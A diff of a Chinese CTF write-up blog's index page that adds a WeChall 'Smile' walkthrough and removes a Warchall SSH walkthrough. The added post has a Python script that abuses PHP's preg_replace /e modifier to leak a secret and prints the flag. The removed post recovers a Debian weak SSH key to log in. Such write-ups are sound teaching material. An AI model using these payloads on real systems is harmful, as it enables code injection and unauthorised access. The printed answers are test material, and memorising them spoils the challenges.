@@ -234,7 +234,7 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">356</span>
+          <span class="site-state-item-count">357</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -375,6 +375,134 @@ p.spoiler {
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-smile/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-smile/" class="post-title-link" itemprop="url">WeChall - Smile</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-06-20 16:11:10 / Modified: 16:11:11" itemprop="dateCreated datePublished" datetime="2026-06-20T16:11:10+08:00">2026-06-20</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-smile/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-smile/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<p>WeChall 邀请用户帮忙添加新表情（smiley）到
+bb_decoder。提交表单需要提供正则 pattern 和替换路径。源码文件为
+<code>smile.php</code> 和 <code>LIVIN_Smile.php</code>。</p>
+<h3 id="source-analysis">Source Analysis</h3>
+<p><code>LIVIN_Smile.php</code> 中的核心函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">replaceSmiley</span>(<span class="params"><span class="variable">$smiley</span>, <span class="variable">$path</span>, <span class="variable">$text</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$smiley</span>, <span class="variable">$path</span>, <span class="variable">$text</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>$smiley</code>（用户输入的 pattern）直接被传入
+<code>preg_replace()</code>。如果 pattern 包含 <code>/e</code>
+修饰符，<code>preg_replace</code> 会把
+<code>$path</code>（替换字符串）当作 PHP 代码执行。PHP 5.5 起废弃了
+<code>/e</code>，并在 PHP 7.0 移除，因为它极易导致代码注入。</p>
+<p><code>solution</code> 以常量形式定义在 <code>smile.php</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;LIVINSKULL_SMILEY_SOLUTION&#x27;</span>, <span class="title class_">LIVIN_Smile</span>::<span class="title function_ invoke__">getSolution</span>());</span><br></pre></td></tr></table></figure>
+<p>通过 <code>LIVIN_Smile::getSolution()</code> 返回一个 32
+位随机字符串，存储在 session 中。</p>
+<h3 id="exploit">Exploit</h3>
+<p><code>secure.php</code> 对 <code>filename</code> 字段做了过滤：禁止
+<code>$</code>、<code>(</code>、<code>`</code>、<code>GWF</code>、<code>Common</code>、<code>include</code>、<code>require</code>、<code>eval</code>
+等关键字。但常量名 <code>LIVINSKULL_SMILEY_SOLUTION</code>
+不包含任何被禁字符，可以直接通过检查。</p>
+<p><strong>攻击步骤：</strong></p>
+<ol type="1">
+<li>GET <code>smile.php</code> 获取 CSRF token</li>
+<li>POST 到 <code>smile.php</code>，pattern 为 <code>/.*/e</code>（启用
+eval），filename 为 <code>LIVINSKULL_SMILEY_SOLUTION</code>（PHP
+常量名）</li>
+<li><code>testSmiley()</code> 调用
+<code>preg_replace('/.*/e', 'LIVINSKULL_SMILEY_SOLUTION', $text)</code>，<code>/e</code>
+使 <code>LIVINSKULL_SMILEY_SOLUTION</code> 被当作 PHP
+代码执行，返回常量值（32 位 solution 字符串）</li>
+<li>测试输出框中直接显示 solution</li>
+<li><code>looksHarmless()</code> 检查会失败，但 solution 已经泄露</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re</span><br><span class="line"></span><br><span class="line">BASE = <span class="string">&#x27;http://www.wechall.net/en/challenge/livinskull/smile&#x27;</span></span><br><span class="line">COOKIE = &#123;<span class="string">&#x27;WC&#x27;</span>: <span class="string">&#x27;your_cookie_here&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">s.cookies.update(COOKIE)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: Get CSRF token</span></span><br><span class="line">r = s.get(<span class="string">f&#x27;<span class="subst">&#123;BASE&#125;</span>/smile.php&#x27;</span>)</span><br><span class="line">csrf = re.search(<span class="string">r&#x27;gwf3_csrf&quot; value=&quot;([^&quot;]+)&quot;&#x27;</span>, r.text).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: Exploit /e modifier to leak solution</span></span><br><span class="line">r = s.post(<span class="string">f&#x27;<span class="subst">&#123;BASE&#125;</span>/smile.php&#x27;</span>, data=&#123;</span><br><span class="line">    <span class="string">&#x27;pattern&#x27;</span>: <span class="string">&#x27;/.*/e&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;filename&#x27;</span>: <span class="string">&#x27;LIVINSKULL_SMILEY_SOLUTION&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;add&#x27;</span>: <span class="string">&#x27;Add&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;gwf3_csrf&#x27;</span>: csrf,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment"># Solution appears in test output box (repeated twice)</span></span><br><span class="line">solution = re.search(<span class="string">r&#x27;[A-Za-z0-9]&#123;32&#125;&#x27;</span>, r.text).group()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Solution: <span class="subst">&#123;solution&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: Submit solution</span></span><br><span class="line">r2 = s.get(<span class="string">f&#x27;<span class="subst">&#123;BASE&#125;</span>/index.php&#x27;</span>)</span><br><span class="line">csrf2 = re.search(<span class="string">r&#x27;gwf3_csrf&quot; value=&quot;([^&quot;]+)&quot;&#x27;</span>, r2.text).group(<span class="number">1</span>)</span><br><span class="line">r3 = s.post(<span class="string">f&#x27;<span class="subst">&#123;BASE&#125;</span>/index.php&#x27;</span>, data=&#123;</span><br><span class="line">    <span class="string">&#x27;answer&#x27;</span>: solution,</span><br><span class="line">    <span class="string">&#x27;solve&#x27;</span>: <span class="string">&#x27;Submit&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;gwf3_csrf&#x27;</span>: csrf2,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;already solved&#x27;</span> <span class="keyword">in</span> r3.text.lower() <span class="keyword">or</span> <span class="string">&#x27;correct&#x27;</span> <span class="keyword">in</span> r3.text.lower():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;✅ Solved!&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">26HBWfURiuNwk9VHErLQeXKOdj2rSctO</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1619,124 +1747,6 @@ injection 被堵了。</p>
 applet。如服务器已有提交记录，会提示 "Your answer is correct but you
 have already solved this challenge."</p>
 <span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">feb3a1f6e5e259f381f42a4e72aceaea204403fab7eec9a2d3d0bcff076a647be88f6f6caeeb1b6295aabba9807f1a2260b466f9f0512498fb50300703eb2552</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-ssh-z-is-sleeping/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-ssh-z-is-sleeping/" class="post-title-link" itemprop="url">WeChall - SSH... Z is sleeping</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-06-14 13:10:30 / Modified: 13:10:31" itemprop="dateCreated datePublished" datetime="2026-06-14T13:10:30+08:00">2026-06-14</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-ssh-z-is-sleeping/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-ssh-z-is-sleeping/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<p>Warchall level8：Z 睡着了，SSH key 暴露在
-<code>/home/level/08_sshz/backups/</code>。目标是找到对应私钥，以
-<code>level08</code> 登录。</p>
-<h3 id="solution">Solution</h3>
-<p>这题利用 Debian OpenSSL 弱密钥漏洞（2008 年 CVE-2008-0166）。Debian
-的 OpenSSL 包因注释掉 <code>md_rand.c</code> 中两行
-<code>MD_Update(&amp;m,buf,j)</code>，导致 PRNG 仅以进程 PID
-作为随机种子，可能的密钥只有 32768 种。</p>
-<p><strong>Step 1: 获取 public key</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 从 Warchall 服务器读取公钥</span></span><br><span class="line">$ <span class="built_in">cat</span> /home/level/08_sshz/backups/authorized_keys.backup</span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLbM20VLy+Bf7fjHk...</span><br></pre></td></tr></table></figure>
-<p><strong>Step 2: 计算 MD5 fingerprint</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -l -E md5 -f authorized_keys.backup</span><br><span class="line">2048 MD5:2b:<span class="built_in">cd</span>:07:a7:01:e9:4a:04:74:d7:7e:e4:d6:d0:f8:06 ...</span><br></pre></td></tr></table></figure>
-<p><strong>Step 3: 在 Debian weak key 集中匹配</strong></p>
-<p>下载已知弱密钥集合。原 ANSSI-FR 仓库已被删除，可使用 g0tmi1k
-维护的镜像：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 克隆镜像（如已有关键集合可跳过）</span></span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/g0tmi1k/debian-ssh</span><br><span class="line">$ <span class="built_in">cd</span> debian-ssh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解压 RSA 2048 位 SSH 密钥</span></span><br><span class="line">$ tar -xjf common_keys/debian_ssh_rsa_2048_x86.tar.bz2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 去掉冒号搜索指纹文件名</span></span><br><span class="line">$ find rsa/ -name <span class="string">&#x27;*2bcd07a701e94a0474d77ee4d6d0f806*&#x27;</span></span><br><span class="line">rsa/2048/2bcd07a701e94a0474d77ee4d6d0f806-23669</span><br></pre></td></tr></table></figure>
-<p>指纹对应 PID 23669 的 RSA 2048 位密钥。</p>
-<p><strong>说明：</strong> 该 key set 的文件名格式为
-<code>&lt;fingerprint_hex&gt;-&lt;PID&gt;</code>，因此直接
-<code>find</code> 匹配指纹（去除冒号）即可定位，无需逐 key 计算。</p>
-<p><strong>Step 4: SSH 登录</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -i rsa/2048/2bcd07a701e94a0474d77ee4d6d0f806-23669 \</span><br><span class="line">    level08@warchall.net -p 19198</span><br></pre></td></tr></table></figure>
-<p>注意：用户是 <code>level08</code>，不是 <code>z</code>；使用
-<code>-i</code> 指定密钥文件。端口 19198 是 Warchall SSH 服务端口。</p>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">PrivateKeysAreGold</span></span>
 
       
     </div>
